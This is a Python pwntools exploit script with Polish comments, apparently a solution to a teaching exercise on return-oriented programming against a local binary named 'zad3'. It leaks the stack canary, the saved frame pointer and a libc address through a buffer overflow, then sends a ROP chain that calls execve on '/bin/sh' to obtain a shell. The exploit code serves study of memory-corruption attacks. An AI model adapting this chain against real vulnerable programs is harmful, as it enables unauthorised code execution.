"""
Return Oriented Programming (ROP)
"""

from pwn import *

# Poniższe offsety nie są uniwersalne i
# należy zaadaptować je do swojej lokalnej wersji libc
#
# $ ldd zad3
#	linux-vdso.so.1 (0x00007ffd7b17a000)
#	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe1d5400000)
#   /lib64/ld-linux-x86-64.so.2 (0x00007fe1d5709000)
#
# $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
# i wyszukujemy pozycje odpowiednich gadgetów
#
# 0x000000000003fa43 : pop rax ; ret
pop_rax = 0x000000000003fa43
# 0x0000000000023b65 : pop rdi ; ret
pop_rdi = 0x0000000000023b65
# 0x00000000000251be : pop rsi ; ret
pop_rsi = 0x00000000000251be
# 0x0000000000166262 : pop rdx ; ret
pop_rdx = 0x0000000000166262
# 0x00000000000227b2 # syscall
syscall = 0x00000000000227b2


p = process("./zad3")

# Wypisanie layoutu pamięci wirtualnej (np. pod zweryfikowanie offsetów)
with open(f"/proc/{p.pid}/maps", "r") as f:
    print(f.read())

# gdb.attach(p)
# input()
# Nadpisujemy bufor razem z nullbytem na początku kanarka
# aby wypisać dalszą zawartość stosu (aż do kolejnego nullbyte)
p.send(b"a"*(0x20+8+1))
buf = p.recv(timeout=1)
# W efekcie otrzymujemy wartość kanarka, do którego na początku
# musimy dokleić nadpisany null-byte
canary = b'\x00' + buf[0x28+1:0x28+8]
print("canary = ", canary)
# ... a także adres poprzedniej ramki stosu, a więc adres
# gdzie znajduje się stos
caller_rbp = u64(buf[0x28+8:].ljust(8, b'\x00'))
print("caller_rbp = ", hex(caller_rbp))

# Następnie wykonujemy dłuższe nadpisanie bufora, aby wypisać
# adres powrotu z funkcji main. Funkcja main jest wołana przez libc.so,
# więc uzyskamy adres, który pozwoli nam wyliczyć adres bazowy libc
p.send(b"a" * 0x48)
buf = p.recv(timeout=1)
ret_to_libc = u64(buf[0x48:].ljust(8, b'\x00'))

# Offset 0x23510 również należy zaadaptować do swojej lokalnej wersji libc
# np. sprawdzając różnicę między ret_to_libc, a adresem bazowym pozyskanym z
# /proc/<pid>/maps
libc_base = ret_to_libc - 0x23510
print("ret_to_libc = ", hex(ret_to_libc))
print("libc_base = ", hex(libc_base))

# Finalnie wykorzystujemy uzyskane adresy do wysłania ROP chaina
p.send(
    b"exit\0" +        # 'exit' wyskakuje z pętli, przez co wykonywany jest skok do adresu powrotu
    b"/bin/sh\0" +     # w ramach bufora umieszczamy '/bin/sh\0' jako argument dla execve
    b"a"*(0x28-5-8) +  # dopełniamy bufor do osiągnięcia kanarka
    canary +           # nadpisujemy kanarek poprawną wartością
    p64(caller_rbp) +  # nadpisujemy caller_rbp poprawną wartością
    p64(libc_base + pop_rax) +    # wychodząc z echo skaczemy do pop rax ; ret
    p64(0x3b) +                   # ... który pobiera do rax <= 0x3b (nr. syscalla execve)
    p64(libc_base + pop_rdi) +    # ... i ret skacze do pop rdi ; ret
    p64(caller_rbp - 0x40 + 5) +  # pod rdi umieszczany jest adres na /bin/sh
    p64(libc_base + pop_rsi) +    # ret skacze do pop rsi ; ret
    p64(0) +                      # rsi <= 0 (argv = NULL)
    p64(libc_base + pop_rdx) +    # pop rdx ; ret
    p64(0) +                      # rdx <= 0 (envp = NULL)
    p64(libc_base + syscall))     # i finalnie syscall
# po wykonaniu ROP chaina powinniśmy uzyskać shella
p.interactive()
